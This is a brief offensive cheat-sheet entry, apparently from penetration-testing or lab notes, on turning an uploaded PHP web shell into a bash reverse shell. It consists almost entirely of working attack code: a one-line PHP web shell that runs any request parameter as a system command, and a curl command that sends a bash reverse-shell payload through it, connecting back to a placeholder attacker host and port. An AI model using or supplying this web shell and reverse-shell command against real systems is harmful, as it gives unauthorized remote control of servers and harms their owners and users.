### bash reverse shell from a php 

When you have one of these uploaded:

```php
<?php system($_REQUEST['cmd']); ?>
```

and need a revshell.

```bash
curl http://10.10.10.101/cmd.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'"
```
